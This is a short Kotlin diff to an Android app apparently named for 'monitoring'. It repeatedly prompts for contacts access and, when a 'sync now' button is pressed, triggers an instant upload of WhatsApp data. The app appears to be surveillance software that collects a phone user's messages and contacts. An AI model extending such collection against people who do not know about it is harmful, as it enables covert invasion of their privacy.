@@ -57,6 +57,10 @@ class MainActivity : AppCompatActivity() {
         ActivityResultContracts.StartActivityForResult()
     ) { refreshPermissionButtons() }
 
+    private val contactsPermissionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { refreshPermissionButtons() }
+
     private val statusHandler = Handler(Looper.getMainLooper())
     private val statusUpdater = object : Runnable {
         override fun run() {
@@ -146,6 +150,7 @@ class MainActivity : AppCompatActivity() {
         // unreliable in the background even with battery exemption granted, so
         // the admin/user needs a manual way to force an immediate sync.
         binding.btnSyncNow.setOnClickListener {
+            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
             SyncScheduler.runOnce(applicationContext)
         }
     }
@@ -193,6 +198,13 @@ class MainActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
+        if (androidx.core.content.ContextCompat.checkSelfPermission(
+                this,
+                Manifest.permission.READ_CONTACTS
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            contactsPermissionLauncher.launch(Manifest.permission.READ_CONTACTS)
+        }
         refreshPermissionButtons()
         statusUpdater.run()
         uploadCurrentFcmToken()
